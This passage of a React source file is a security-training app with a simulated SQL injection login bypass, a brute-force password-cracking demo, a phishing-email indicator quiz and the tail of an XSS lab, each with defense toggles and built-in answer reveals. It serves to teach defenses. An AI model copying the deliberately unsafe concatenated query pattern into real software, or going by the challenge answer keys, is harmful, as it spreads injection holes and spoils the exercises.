                          <button onClick={() => setAlertOpen(false)}
                            style={{background:"#ddd", border:"1px solid #999", borderRadius:3, padding:"2px 20px", fontSize:12, cursor:"pointer", fontFamily:"sans-serif"}}>
                            OK
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </Card>

          {/* What just happened */}
          {labState !== "idle" && (
            <Card>
              <SectionHead>What Happened</SectionHead>
              {labState === "neutral" && (
                <p className="text-xs text-slate-500">This payload contains no HTML or script tags, so it poses no XSS risk — it's just plain text.</p>
              )}
              {labState === "fail" && (
                <div className="space-y-1.5">
                  <div className="flex items-center gap-2 text-xs text-red-400"><XCircle size={12}/> No defenses active — payload reached the DOM unmodified</div>
                  <div className="flex items-center gap-2 text-xs text-red-400"><XCircle size={12}/> Browser parsed the tags as HTML and executed the script</div>
                  <div className="flex items-center gap-2 text-xs text-slate-500"><Info size={12}/> Every visitor to this page would trigger the script</div>
                </div>
              )}
              {labState === "success" && (
                <div className="space-y-1.5">
                  {applied.map(a=>(
                    <div key={a} className="flex items-center gap-2 text-xs text-green-400"><CheckCircle size={12}/> {a} applied</div>
                  ))}
                  <div className="flex items-center gap-2 text-xs text-slate-500 mt-1"><Info size={12}/> The comment is stored and served — but executes nothing</div>
                </div>
              )}
            </Card>
          )}
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Enable <strong className="text-slate-200">Output Encoding</strong> (recommended first choice), <strong className="text-slate-200">Input Sanitization</strong>, or <strong className="text-slate-200">Content Security Policy</strong> — any one works. Toggle it on and click <strong>Post Comment</strong>. Watch the browser preview: the payload will render as escaped text and the JS alert dialog will not appear.</p>}
        failMsg="The script executed in the browser — the attack succeeded. Dismiss the alert, enable at least one defense, and try again."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── SQL INJECTION LAB ────────────────────────────────────────────────────────
const SQLiLab = ({ addLog, addScore, onBack }) => {
  const [selId, setSelId]       = useState("s1");
  const [input, setInput]       = useState(SQL_PAYLOADS[0].val);
  const [def, setDef]           = useState({ parameterized:false, validate:false, waf:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredOutcomes          = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);

  const isInjection = INJECT_RE.some(r => r.test(input));
  const buildQuery = () => def.parameterized
    ? `SELECT * FROM users\nWHERE username = $1\n\n-- $1 bound as literal data:\n-- "${input.slice(0,40)}"`
    : `SELECT * FROM users\nWHERE username = '${input}'`;

  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const run = () => {
    if (!isInjection) { setLabState("neutral"); return; }
    let outcome, rows;
    if (def.waf)               { outcome="waf";      rows=[]; }
    else if (def.validate)     { outcome="validate"; rows=[]; }
    else if (def.parameterized){ outcome="safe";     rows=FAKE_DB.filter(u=>u.username===input); }
    else                       { outcome="pwned";    rows=FAKE_DB; }
    setResult({ outcome, rows, query:buildQuery() });
    if (outcome !== "pwned") {
      setLabState("success");
      addLog(mkEvent("sqli","Attacker","Database","info",`Injection blocked (${OUTCOME_META[outcome].label})`));
      if (!scoredOutcomes.current.has(outcome)) { addScore("sqli",30); scoredOutcomes.current.add(outcome); setJustScored(true); }
      else setJustScored(false);
    } else {
      setLabState("fail");
      addLog(mkEvent("sqli","Attacker","Database","critical",`Injection succeeded — ${rows.length} rows exposed`));
    }
  };

  const pick = (id) => { setSelId(id); const p=SQL_PAYLOADS.find(x=>x.id===id); if(p) setInput(p.val); reset(); };

  const sqliReveal = (
    <p>Enable <strong className="text-slate-200">Parameterized Queries</strong> — the definitive fix. The database receives the SQL command structure and the user value separately, so no matter what characters are in the input, they can never be interpreted as SQL. Input Validation and WAF are useful supplements but can be bypassed; parameterized queries cannot.</p>
  );

  const successContent = (
    <div>
      <p>{result?.outcome==="safe" ? "Parameterized queries separated the SQL command from the user's value. The database engine treated the entire input as a literal string — even though it contains SQL syntax, it was never executed as a query." : result?.outcome==="waf" ? "The WAF matched the request against known injection signatures and dropped it before it reached the application layer." : "Input validation detected SQL metacharacters and rejected the request before it was passed to the database."} {result?.outcome !== "safe" && "Note: this layer is a useful supplement, but parameterized queries are the most reliable long-term fix."}</p>
    </div>
  );

  // Derive a human-readable "login outcome" label for the login panel
  const loginOutcome = result ? (
    result.outcome === "pwned"
      ? { ok:false, title:"AUTH BYPASS — attack succeeded", sub:"Query returned all rows; attacker logged in as admin" }
      : result.outcome === "waf"
        ? { ok:true,  title:"Blocked by Web Application Firewall", sub:"Request never reached the application" }
        : result.outcome === "validate"
          ? { ok:true,  title:"Rejected by Input Validation", sub:"Server refused the input before building a query" }
          : { ok:true,  title:"Safe — query executed as parameterized", sub:"User input treated as data, not as SQL syntax" }
  ) : null;

  return (
    <div className="space-y-4">
      <LabHeader title="SQL Injection Simulator" subtitle="Stop an attacker from manipulating your database query" statusOk label="Synthetic DB" onBack={onBack}/>

      <ChallengeBox accent="red" title="Challenge"
        showSolution={showSolution} onToggle={() => setShowSolution(v=>!v)} solutionContent={sqliReveal}>
        An attacker is submitting a malicious username to the login form. Configure your data-layer defenses and click <strong>Submit Login</strong> to execute the query — then see whether the injection succeeds or is stopped.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        {/* ── Left: attack config + defenses ── */}
        <div className="space-y-3">
          <Card>
            <SectionHead>Attack Input</SectionHead>
            <select className="w-full bg-slate-800 border border-slate-700 text-slate-300 text-sm rounded-lg px-3 py-2 mb-3"
              value={selId} onChange={e=>pick(e.target.value)}>
              {SQL_PAYLOADS.map(p=><option key={p.id} value={p.id}>{p.label} — {p.sev}</option>)}
            </select>
            <label className="text-xs text-slate-600 block mb-1">Username field value</label>
            <input className="w-full bg-slate-800 border border-slate-700 text-green-400 font-mono text-sm rounded-lg px-3 py-2"
              value={input} onChange={e=>{setInput(e.target.value); reset();}}/>
            {isInjection && (
              <div className="mt-2 flex items-center gap-1.5 text-xs text-red-400">
                <AlertTriangle size={12}/> SQL injection pattern detected
              </div>
            )}
          </Card>

          <Card>
            <SectionHead>Live Query Preview</SectionHead>
            <p className="text-xs text-slate-600 mb-2 leading-relaxed">
              {def.parameterized
                ? "Parameterized: user input is a bound parameter ($1), never concatenated into the SQL string."
                : "Unsafe: input is string-concatenated directly into the query — any SQL syntax in it executes."}
            </p>
            <pre className="bg-slate-950 border border-slate-700 rounded-lg p-3 font-mono text-xs text-amber-300 overflow-x-auto whitespace-pre-wrap">{buildQuery()}</pre>
          </Card>

          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.parameterized} onChange={v=>{setDef(d=>({...d,parameterized:v})); reset();}} label="Parameterized Queries" desc="Bind user input as a value, never as SQL syntax"/>
              <Toggle enabled={def.validate}      onChange={v=>{setDef(d=>({...d,validate:v})); reset();}}      label="Input Validation"     desc="Reject inputs matching SQL metacharacter patterns"/>
              <Toggle enabled={def.waf}           onChange={v=>{setDef(d=>({...d,waf:v})); reset();}}           label="Web Application Firewall" desc="Perimeter filter for injection signatures"/>
            </div>
            <button onClick={run}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Submit Login
            </button>
          </Card>
        </div>

        {/* ── Right: login panel + db result ── */}
        <div className="space-y-3">
          {/* Simulated login form */}
          <Card>
            <SectionHead>Login Form — Attack Simulation</SectionHead>
            <div className="bg-slate-950 rounded-xl border border-slate-800 p-4">
              <div className="text-[10px] text-slate-600 font-mono mb-3">acme-corp.internal › /login</div>
              <div className="space-y-2 mb-3">
                <div>
                  <div className="text-xs text-slate-600 mb-1">Username</div>
                  <div className={`rounded-lg px-3 py-2 font-mono text-sm border ${isInjection?"border-red-500/40 bg-red-950/30 text-red-300":"border-slate-700 bg-slate-800 text-green-400"}`}>
                    {input || <span className="text-slate-600">(empty)</span>}
                  </div>
                </div>
                <div>
                  <div className="text-xs text-slate-600 mb-1">Password</div>
                  <div className="bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 font-mono text-sm text-slate-500">••••••••</div>
                </div>
              </div>

              {/* Login result */}
              {loginOutcome ? (
                <div className={`rounded-lg p-3 border ${loginOutcome.ok ? "bg-green-900/20 border-green-500/30" : "bg-red-900/30 border-red-500/50"}`}>
                  <div className={`text-xs font-bold mb-0.5 ${loginOutcome.ok ? "text-green-400" : "text-red-400"}`}>
                    {loginOutcome.ok ? "🔒 " : "⚠️ "}{loginOutcome.title}
                  </div>
                  <div className="text-xs text-slate-400">{loginOutcome.sub}</div>
                </div>
              ) : (
                <div className="bg-slate-800/40 rounded-lg px-3 py-2 text-center text-xs text-slate-600">
                  Click "Submit Login" to execute the query
                </div>
              )}
            </div>
          </Card>

          {/* Database table (always visible for context) */}
          <Card>
            <SectionHead>Database — users table</SectionHead>
            <table className="w-full text-xs font-mono">
              <thead><tr className="border-b border-slate-800">
                {["id","username","email","role"].map(h=><th key={h} className="text-left text-slate-600 py-1 pr-3">{h}</th>)}
              </tr></thead>
              <tbody>
                {FAKE_DB.map(r => {
                  const exposed = result?.outcome === "pwned";
                  return (
                    <tr key={r.id} className={`border-b border-slate-900 transition-colors ${exposed ? "bg-red-950/20" : ""}`}>
                      <td className="text-slate-600 py-1 pr-3">{r.id}</td>
                      <td className={`py-1 pr-3 ${exposed ? "text-red-300" : "text-green-400"}`}>{r.username}</td>
                      <td className="py-1 pr-3 text-slate-500">{r.email}</td>
                      <td className={`py-1 pr-3 ${r.role==="admin"?(exposed?"text-red-400 font-bold":"text-red-400"):"text-slate-500"}`}>{r.role}</td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
            {result?.outcome === "pwned" && (
              <div className="mt-2 flex items-center gap-1.5 text-xs text-red-400">
                <AlertTriangle size={11}/> All {FAKE_DB.length} rows returned — attacker now has every account
              </div>
            )}
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Enable <strong className="text-slate-200">Parameterized Queries</strong> and click <strong>Submit Login</strong>. The query preview will switch to <code className="text-slate-400">$1</code> binding syntax — the injection string is treated as a literal username, no rows are returned, and the login form shows the request safely rejected.</p>}
        failMsg="The injection succeeded — the attacker bypassed authentication and the entire user table was exposed. Enable a defense and try again."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── PASSWORD LAB ─────────────────────────────────────────────────────────────
const PasswordLab = ({ addLog, addScore, onBack }) => {
  const [pwd, setPwd]           = useState("password123");
  const [def, setDef]           = useState({ salt:false, rateLimit:false, complexity:false });
  const [cracking, setCracking] = useState(false);
  const [progress, setProgress] = useState(0);
  const [attempts, setAttempts] = useState(0);
  const [labState, setLabState] = useState("idle");
  const [attackLog, setAttackLog]   = useState([]); // scrolling terminal lines
  const [crackedPwd, setCrackedPwd] = useState(false);
  const timerRef   = useRef(null);
  const attRef     = useRef(0);
  const scoredRef  = useRef(new Set());
  const defAtRun   = useRef({ salt:false, rateLimit:false, complexity:false });
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);
  const logRef = useRef(null); // for auto-scroll

  useEffect(() => { setShowAnswer(false); }, [labState]);

  const entropy  = calcEntropy(pwd);
  const hash     = simpleHash(pwd + (def.salt ? "_SALT_3d9f$" : ""));
  const WEAK_LIST= ["password","password123","12345678","admin","letmein","qwerty","abc123","monkey","dragon","welcome"];
  const isWeak   = WEAK_LIST.some(w => pwd.toLowerCase().includes(w));
  const LIMIT    = def.rateLimit ? 20 : 500;

  const stopTimer = useCallback(() => { clearInterval(timerRef.current); setCracking(false); }, []);
  const reset = () => {
    stopTimer(); setProgress(0); setAttempts(0); attRef.current = 0;
    setLabState("idle"); setCrackedPwd(false); setJustScored(false); setAttackLog([]);
  };

  const start = () => {
    if (cracking) { stopTimer(); return; }
    // Complexity check: if complexity is on and password is weak, enforce it
    if (def.complexity && isWeak) {
      setAttackLog([{ id:0, text:"[COMPLEXITY POLICY] Password rejected — does not meet complexity requirements.", type:"blocked" }]);
      setLabState("success");
      defAtRun.current = { ...def };
      addLog(mkEvent("bruteforce","Auth Server","Policy","info","Weak password rejected by complexity policy"));
      const key = `complexity|${pwd}`;
      if (!scoredRef.current.has(key)) { addScore("password",20); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
      return;
    }
    defAtRun.current = { salt:def.salt, rateLimit:def.rateLimit, complexity:def.complexity };
    setCracking(true); setProgress(0); setAttempts(0); setLabState("idle");
    setCrackedPwd(false); setJustScored(false); setAttackLog([]); attRef.current = 0;
    addLog(mkEvent("bruteforce","Attacker","Auth Server","high","Brute-force attack started"));

    const step = def.rateLimit ? 1 : (isWeak ? 25 : 10);
    const ms   = def.rateLimit ? 400 : 80;
    let lineId = 1;

    timerRef.current = setInterval(() => {
      attRef.current = Math.min(attRef.current + step, LIMIT);
      setAttempts(attRef.current);
      setProgress(Math.round((attRef.current / LIMIT) * 100));

      // Build a plausible guess for the terminal
      const guessBase = PWD_WORDLIST[attRef.current % PWD_WORDLIST.length];
      const suffix    = attRef.current > PWD_WORDLIST.length ? String(Math.floor(attRef.current / PWD_WORDLIST.length)) : "";
      const guess     = guessBase + suffix;
      const guessHash = simpleHash(guess + (defAtRun.current.salt ? "_SALT_3d9f$" : ""));
      const matched   = guess === pwd;

      setAttackLog(prev => [...prev.slice(-60), {
        id: lineId++,
        text: `[${String(attRef.current).padStart(4," ")}] trying: ${(guess).padEnd(18," ")} hash: ${guessHash.slice(0,16)}… ${matched ? "← MATCH!" : ""}`,
        type: matched ? "match" : "normal",
      }]);

      if (attRef.current >= LIMIT) {
        clearInterval(timerRef.current); setCracking(false);
        const cracked = isWeak && !defAtRun.current.rateLimit && !defAtRun.current.complexity;
        setCrackedPwd(cracked);
        setLabState(cracked ? "fail" : "success");
        addLog(mkEvent("bruteforce","Attacker","Auth Server", cracked?"critical":"info",
          cracked ? `Password "${pwd}" cracked` : `Attack exhausted — ${attRef.current} attempts`));
        if (!cracked) {
          const key = `${pwd}|${defAtRun.current.salt}|${defAtRun.current.rateLimit}|${defAtRun.current.complexity}`;
          if (!scoredRef.current.has(key)) { addScore("password",20); scoredRef.current.add(key); setJustScored(true); }
        }
        setAttackLog(prev => [...prev, {
          id: lineId++,
          text: cracked ? `\n>>> PASSWORD CRACKED: ${pwd} <<<` : "\n>>> Attack exhausted — password not found <<<",
          type: cracked ? "cracked" : "stopped",
        }]);
      }
    }, ms);
  };

  useEffect(() => {
    if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight;
  }, [attackLog]);
  useEffect(() => () => clearInterval(timerRef.current), []);

  const strColor = {"Very Weak":"text-red-400","Weak":"text-orange-400","Moderate":"text-amber-400","Strong":"text-green-400","Very Strong":"text-cyan-400"};
  const strBar   = {"Very Weak":"bg-red-500","Weak":"bg-orange-500","Moderate":"bg-amber-500","Strong":"bg-green-500","Very Strong":"bg-cyan-500"};
  const strWidth = {"Very Weak":"12%","Weak":"28%","Moderate":"54%","Strong":"75%","Very Strong":"100%"};

  const pwdReveal = (
    <p>Enable <strong className="text-slate-200">Rate Limiting</strong> to cap login attempts per window (making brute-force take years instead of seconds), <strong className="text-slate-200">Password Salting</strong> to defeat precomputed rainbow-table lookups, and <strong className="text-slate-200">Complexity Requirements</strong> to prevent weak passwords from being set at all. In production, use all three.</p>
  );

  const successContent = (
    <div>
      <p>
        {defAtRun.current.complexity && isWeak
          ? "Complexity requirements blocked the weak password from being set — the attacker never even got the chance to brute-force it."
          : defAtRun.current.rateLimit
            ? `Rate limiting capped attempts to ${LIMIT}. At the throttled speed, even a weak password would take an impractical amount of time to crack.`
            : "The password's entropy was high enough that the simulated wordlist attack was exhausted before finding it."}
        {defAtRun.current.salt ? " Password salting also ensures the hash can't be looked up in a precomputed rainbow table." : ""}
      </p>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="Password Cracker Demo" subtitle="Configure authentication defenses to survive a brute-force attack"
        statusOk={!cracking} statusLabel={cracking?"Attack Running":"Ready"} onBack={onBack}/>

      <ChallengeBox accent="blue" title="Challenge"
        showSolution={showSolution} onToggle={() => setShowSolution(v=>!v)} solutionContent={pwdReveal}>
        An attacker has obtained a password hash and is running a dictionary + brute-force attack. Configure server-side authentication defenses, then click <strong>Start Attack</strong> to run the simulation.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        {/* ── Left: password + defenses ── */}
        <div className="space-y-3">
          <Card>
            <SectionHead>Target Password</SectionHead>
            <input className="w-full bg-slate-800 border border-slate-700 text-green-400 font-mono text-sm rounded-lg px-3 py-2 mb-2"
              value={pwd} onChange={e=>{setPwd(e.target.value); reset();}} placeholder="Enter a password…"/>
            <div className="flex flex-wrap gap-1.5">
              {["password123","admin","P@$$w0rd!","c0rr3ctH0rse","Tr0ub4d0r&3"].map(p=>(
                <button key={p} onClick={()=>{setPwd(p); reset();}}
                  className="text-xs bg-slate-800 hover:bg-slate-700 text-slate-500 px-2 py-1 rounded border border-slate-700">
                  {p.length>12?p.slice(0,12)+"…":p}
                </button>
              ))}
            </div>
            <div className="mt-3 space-y-1.5">
              {[
                ["Entropy",`${entropy.bits} bits`,"font-mono text-white"],
                ["Strength",entropy.strength,strColor[entropy.strength]+" font-semibold"],
                ["Length",`${pwd.length} chars`,"font-mono text-white"],
                ["Dictionary risk",isWeak?"High":"Low",isWeak?"text-red-400":"text-green-400"],
              ].map(([k,v,vc])=>(
                <div key={k} className="flex justify-between text-sm">
                  <span className="text-slate-500">{k}</span><span className={vc}>{v}</span>
                </div>
              ))}
              <div className="w-full bg-slate-800 rounded-full h-1.5 mt-1">
                <div className={`h-1.5 rounded-full transition-all ${strBar[entropy.strength]}`} style={{width:strWidth[entropy.strength]}}/>
              </div>
            </div>
            <div className="mt-3">
              <div className="text-xs text-slate-600 mb-1">Hash ({def.salt?"salted":"unsalted"}):</div>
              <div className="bg-slate-950 rounded-lg px-3 py-2 font-mono text-[11px] text-amber-400 break-all">{hash}</div>
            </div>
          </Card>

          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.rateLimit}  disabled={cracking} onChange={v=>{setDef(d=>({...d,rateLimit:v})); reset();}}  label="Rate Limiting"    desc="Cap attempts to 20 per window (simulates account lockout)"/>
              <Toggle enabled={def.salt}       disabled={cracking} onChange={v=>{setDef(d=>({...d,salt:v})); reset();}}       label="Password Salting" desc="Add unique random salt before hashing — defeats rainbow tables"/>
              <Toggle enabled={def.complexity} disabled={cracking} onChange={v=>{setDef(d=>({...d,complexity:v})); reset();}} label="Complexity Policy" desc="Reject passwords that appear in a common wordlist"/>
            </div>
            <button onClick={start}
              className={`mt-4 w-full flex items-center justify-center gap-2 font-semibold py-2 px-4 rounded-lg transition-colors text-sm ${cracking?"bg-red-700 hover:bg-red-600":"bg-cyan-700 hover:bg-cyan-600"} text-white`}>
              {cracking ? <><Square size={14}/> Stop Attack</> : <><Play size={14}/> Start Attack</>}
            </button>
          </Card>
        </div>

        {/* ── Right: attack terminal ── */}
        <div className="space-y-3">
          <Card>
            <SectionHead>Attack Progress</SectionHead>
            <div className="text-center mb-3">
              <div className={`text-5xl font-mono font-bold tabular-nums ${crackedPwd?"text-red-400":labState==="success"?"text-green-400":"text-white"}`}>
                {attempts.toLocaleString()}
              </div>
              <div className="text-slate-600 text-xs mt-1">attempts / {LIMIT.toLocaleString()} max</div>
            </div>
            <div className="w-full bg-slate-800 rounded-full h-2.5 overflow-hidden mb-2">
              <div className={`h-2.5 rounded-full transition-none ${crackedPwd?"bg-red-500":cracking?"bg-orange-500 animate-pulse":progress>0&&labState==="success"?"bg-green-500":"bg-slate-700"}`}
                style={{width:`${progress}%`}}/>
            </div>
            {labState !== "idle" && (
              <div className={`text-center text-xs font-semibold mt-1 ${crackedPwd?"text-red-400":labState==="success"?"text-green-400":"text-slate-500"}`}>
                {crackedPwd ? `⚠ CRACKED — "${pwd}" found` : labState==="success" ? "✓ Attack exhausted — password held" : ""}
              </div>
            )}
          </Card>

          {/* Scrolling attack terminal */}
          <Card>
            <SectionHead>Brute-force Terminal</SectionHead>
            <div ref={logRef}
              className="bg-slate-950 rounded-lg border border-slate-800 p-2 font-mono text-[10px] overflow-y-auto"
              style={{height:180}}>
              {attackLog.length === 0 ? (
                <span className="text-slate-700">$ Start the attack to see password attempts…</span>
              ) : (
                attackLog.map(l => (
                  <div key={l.id} className={
                    l.type==="cracked" ? "text-red-400 font-bold" :
                    l.type==="stopped" ? "text-green-400" :
                    l.type==="blocked" ? "text-amber-400" :
                    l.type==="match"   ? "text-yellow-300" :
                    "text-slate-500"}>
                    {l.text}
                  </div>
                ))
              )}
            </div>
          </Card>

          <Card>
            <SectionHead>Why This Matters</SectionHead>
            <p className="text-[11px] text-slate-500 leading-relaxed">
              Brute-force is only feasible when passwords are weak, hashes are unsalted (enabling precomputed lookups), and the authentication endpoint has no rate limiting. Remove any one property and the attack becomes impractical. Remove all three and it fails entirely.
            </p>
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Enable <strong className="text-slate-200">Rate Limiting</strong> and click <strong>Start Attack</strong>. It caps attempts at 20 total — the progress bar will stop early and the terminal will show the attack exhausted before cracking the password. For a stronger defense, also enable <strong className="text-slate-200">Salting</strong> and try a stronger password like <code className="text-slate-400">Tr0ub4d0r&3</code>.</p>}
        failMsg={`"${pwd}" was cracked. The password was in the wordlist and no defenses stopped the attack. Enable protections and try again.`}
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── PHISHING ANALYZER ────────────────────────────────────────────────────────
const PhishingLab = ({ addLog, addScore, onBack }) => {
  const [sel, setSel]           = useState(PHISHING_EMAILS[0]);
  const [checked, setChecked]   = useState({});
  const [labState, setLabState] = useState("idle");
  const [scoreDetails, setScoreDetails] = useState(null);
  const scoredEmails = useRef(new Set());
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);

  const selectEmail = (email) => { setSel(email); setChecked({}); setLabState("idle"); setScoreDetails(null); setShowAnswer(false); };
  const toggleInd   = (key)   => { if (labState !== "idle") return; setChecked(p=>({...p,[key]:!p[key]})); };

  const analyze = () => {
    const expected = new Set(sel.indicators);
    const got      = new Set(Object.keys(checked).filter(k=>checked[k]));
    const correct  = [...got].filter(k=>expected.has(k)).length;
    const missed   = [...expected].filter(k=>!got.has(k)).length;
    const fp       = [...got].filter(k=>!expected.has(k)).length;
    const pts      = Math.max(0, correct*20 - missed*5 - fp*10);
    const success  = correct===expected.size && fp===0;
    setScoreDetails({ correct, missed, fp, pts, total:expected.size });
    setLabState(success ? "success" : "fail");
    addLog(mkEvent("phishing","Analyst","Inbox",sel.risk==="high"?"high":sel.risk==="medium"?"medium":"info",
      `Email #${sel.id}: ${correct}/${expected.size} correct, ${fp} false positive(s)`));
    if (pts > 0 && success && !scoredEmails.current.has(sel.id)) { addScore("phishing",pts); scoredEmails.current.add(sel.id); }
  };

  const riskColor  = { high:"text-red-400",medium:"text-amber-400",low:"text-green-400" };
  const riskBorder = { high:"border-red-500/20",medium:"border-amber-500/20",low:"border-green-500/20" };
  const riskBg     = { high:"bg-red-900/5",     medium:"bg-amber-900/5",     low:"bg-green-900/5"     };

  const phishReveal = (
    <div>
      <p className="mb-2 text-slate-300">Indicators present in this email:</p>
      {sel.indicators.length === 0
        ? <p className="text-slate-400">None — this is a legitimate email. Any checked boxes are false positives.</p>
        : <ul className="space-y-1.5">
            {sel.indicators.map(key=>{
              const meta=INDICATOR_META[key];
              return (
                <li key={key} className="flex items-start gap-2">
                  <meta.Icon size={12} className="text-cyan-500 mt-0.5 flex-shrink-0"/>
                  <span className="text-sm"><strong className="text-slate-200">{meta.label}:</strong> <span className="text-slate-400">{meta.desc}</span></span>
                </li>
              );
            })}
          </ul>
      }
    </div>
  );

  const successContent = scoreDetails && (
    <p>Correct analysis. You identified {scoreDetails.total===0 ? "no indicators (this is a legitimate email)" : `all ${scoreDetails.total} indicator${scoreDetails.total!==1?"s":""} with no false positives`}. Phishing attacks exploit urgency, authority, and deceptive presentation — spotting these cues before acting is the single most effective defense.</p>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="Phishing Email Analyzer" subtitle="Identify social engineering indicators in synthetic email samples" onBack={onBack}/>

      <ChallengeBox accent="orange" title="Challenge"
        showSolution={showSolution} onToggle={() => setShowSolution(v=>!v)} solutionContent={phishReveal}>
        Read the email carefully and check every phishing indicator you can spot. You must identify all indicators with no false positives. Click <strong>Analyze</strong> when ready — your selections are locked in at that point.
      </ChallengeBox>

      {/* Email selector tabs */}
      <div className="flex gap-2">
        {PHISHING_EMAILS.map(e=>(
          <button key={e.id} onClick={()=>selectEmail(e)}
            className={`text-xs px-3 py-2 rounded-lg border transition-all ${sel.id===e.id?"bg-slate-800 border-cyan-500/60 text-cyan-400":"bg-slate-900 border-slate-800 text-slate-500 hover:border-slate-700"}`}>
            Email #{e.id} — <span className={riskColor[e.risk]}>{e.risk.toUpperCase()}</span>
          </button>
        ))}
      </div>

      <div className="grid grid-cols-2 gap-4">
        {/* ── Left: email display ── */}
        <div className={`bg-slate-900 border ${riskBorder[sel.risk]} ${riskBg[sel.risk]} rounded-xl overflow-hidden`}>
          <div className="bg-slate-800/70 px-4 py-3 border-b border-slate-700 space-y-1.5">
            {[["From",sel.from,"font-mono text-white text-xs"],["Subject",sel.subject,"font-semibold text-white"],["Date",sel.date,"text-slate-500 text-xs"]].map(([k,v,vc])=>(
              <div key={k} className="flex gap-2 text-xs items-baseline">
                <span className="text-slate-600 w-14 flex-shrink-0 font-semibold">{k}</span>
                <span className={vc}>{v}</span>
              </div>
            ))}
          </div>
          <div className="p-4">
            <pre className="font-mono text-xs text-slate-400 whitespace-pre-wrap leading-relaxed">{sel.body}</pre>
          </div>
        </div>

        {/* ── Right: indicator checklist ── */}
        <Card>
          <SectionHead>Identify Indicators</SectionHead>
          <p className="text-xs text-slate-600 mb-3 leading-relaxed">Check every phishing indicator you can spot in the email. Uncheck anything that isn't present — false positives count against you.</p>
          <div className="space-y-1.5">
            {Object.entries(INDICATOR_META).map(([key,meta])=>{
              const isOn   = !!checked[key];
              const isCorr = sel.indicators.includes(key);
              const isRight = showAnswer && isOn && isCorr;
              const isMiss  = showAnswer && !isOn && isCorr;
              const isFP    = showAnswer && isOn && !isCorr;
              return (
                <div key={key} onClick={() => toggleInd(key)}
                  className={`flex items-start gap-2.5 p-2.5 rounded-lg border transition-colors select-none ${labState==="idle"?"cursor-pointer":"cursor-default"} ${
                    isRight ? "bg-green-900/20 border-green-500/30"
                    : isMiss  ? "bg-red-900/20 border-red-500/30"
                    : isFP    ? "bg-orange-900/20 border-orange-500/30"
                    : isOn    ? "bg-slate-800/60 border-slate-700"
                    : "border-transparent hover:bg-slate-800/40"}`}>
                  <div className={`mt-0.5 w-4 h-4 rounded flex-shrink-0 border flex items-center justify-center transition-colors ${isOn?"bg-cyan-500 border-cyan-500":"border-slate-600"}`}>
                    {isOn && <span className="text-white text-[10px] font-bold leading-none">✓</span>}
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center gap-1.5 text-sm text-slate-300">
                      <meta.Icon size={12} className="flex-shrink-0 text-slate-500"/>
                      {meta.label}
                    </div>
                    <div className="text-[11px] text-slate-600 mt-0.5">{meta.desc}</div>
                    {showAnswer && (isRight||isMiss||isFP) && (
                      <div className={`text-xs mt-1 font-semibold ${isRight?"text-green-400":isMiss?"text-red-400":"text-orange-400"}`}>
                        {isRight?"✓ Correct":isMiss?"✗ Missed":isFP?"✗ False positive":""}
                      </div>
                    )}
                  </div>
                </div>
              );
            })}
          </div>

          <button onClick={analyze} disabled={labState!=="idle"}
            className={`mt-4 w-full flex items-center justify-center gap-2 font-semibold py-2 px-4 rounded-lg transition-colors text-sm ${labState!=="idle"?"opacity-40 cursor-not-allowed bg-cyan-800":"bg-cyan-700 hover:bg-cyan-600"} text-white`}>
            <Play size={14}/> Analyze Email
          </button>

          {scoreDetails && labState==="fail" && (
            <p className="mt-2 text-xs text-slate-500">
              {scoreDetails.correct}/{scoreDetails.total} correct
              {scoreDetails.fp > 0 ? `, ${scoreDetails.fp} false positive(s)` : ""}
              {" — "}click <span className="text-cyan-400">Reveal Answer</span> below to see which ones.
            </p>
          )}
        </Card>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={(
          <div className="space-y-2">
            <p className="text-slate-300 text-sm">Check <strong>only</strong> these indicators for this email:</p>
            {sel.indicators.length === 0
              ? <p className="text-slate-400 text-sm">None — this is a legitimate email. Leave all boxes unchecked and click Analyze.</p>
              : <ul className="space-y-1.5">
                  {sel.indicators.map(key=>{
                    const meta=INDICATOR_META[key];
                    return (
                      <li key={key} className="flex items-start gap-2">
                        <meta.Icon size={12} className="text-cyan-500 mt-0.5 flex-shrink-0"/>
                        <span className="text-sm"><strong className="text-slate-200">{meta.label}:</strong> <span className="text-slate-400">{meta.desc}</span></span>
                      </li>
                    );
                  })}
                </ul>
            }
          </div>
        )}
        failMsg={`Not quite — ${scoreDetails?.missed||0} missed, ${scoreDetails?.fp||0} false positive(s). Reveal the answer to see the breakdown.`}
        onRetry={()=>{ setLabState("idle"); setChecked({}); setShowSolution(false); }}
        showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

